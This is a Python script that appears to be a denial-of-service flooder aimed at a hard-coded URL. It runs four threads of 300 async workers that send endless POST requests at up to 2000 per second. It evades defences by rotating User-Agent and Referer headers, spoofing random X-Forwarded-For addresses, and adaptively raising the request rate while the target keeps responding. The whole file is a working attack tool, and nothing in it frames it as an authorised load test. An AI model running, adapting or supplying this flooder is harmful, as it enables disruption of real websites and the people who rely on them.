import asyncio
import random
import time
import aiohttp
from fake_useragent import UserAgent
from math import exp
from threading import Thread

TARGET_URL = "https://test.zoomov.cat/"
POST_DATA = {"key": "value"}
TIMEOUT = 3
MAX_RPS = 2000
CONCURRENCY_LEVEL = 300

USER_AGENTS = [UserAgent().chrome, UserAgent().edge, UserAgent().firefox, UserAgent().safari] * 2 + [UserAgent().random for _ in range(2)]
REFERERS = [
    "https://www.google.com", "https://www.youtube.com", "https://www.facebook.com",
    "https://www.twitter.com", "https://www.instagram.com", "https://www.tiktok.com",
    "https://www.netflix.com", "https://www.amazon.com", "https://www.linkedin.com",
    "https://www.reddit.com"
]

class AdaptiveRateLimiter:
    def __init__(self):
        self.current_rps = 500
        self.last_update = time.time()
        self.success_count = 0
        self.error_count = 0

    def update(self, success):
        if success:
            self.success_count += 1
        else:
            self.error_count += 1
        
        if time.time() - self.last_update > 1:
            success_rate = self.success_count / (self.success_count + self.error_count + 1e-9)
            if success_rate > 0.95:
                self.current_rps = min(self.current_rps * 1.2, MAX_RPS)
            elif success_rate < 0.8:
                self.current_rps = max(self.current_rps * 0.8, 100)
            
            self.success_count = 0
            self.error_count = 0
            self.last_update = time.time()

    def get_delay(self):
        return 1 / self.current_rps

def gaussian_delay():
    return max(0.01, min(0.2, random.gauss(0.1, 0.03)))

async def send_request(session, rate_limiter):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    }

    try:
        await asyncio.sleep(gaussian_delay())
        async with session.post(TARGET_URL, json=POST_DATA, headers=headers, timeout=TIMEOUT) as response:
            rate_limiter.update(response.status == 200)
            return response.status
    except:
        rate_limiter.update(False)
        return 0

async def worker(session, rate_limiter, semaphore):
    while True:
        async with semaphore:
            await send_request(session, rate_limiter)

async def main():
    rate_limiter = AdaptiveRateLimiter()
    semaphore = asyncio.Semaphore(CONCURRENCY_LEVEL)
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, force_close=False)) as session:
        tasks = [asyncio.create_task(worker(session, rate_limiter, semaphore)) for _ in range(CONCURRENCY_LEVEL)]
        await asyncio.gather(*tasks)

def run_asyncio_loop():
    asyncio.run(main())

if __name__ == "__main__":
    for _ in range(4):
        Thread(target=run_asyncio_loop, daemon=True).start()
    while True:
        time.sleep(1)
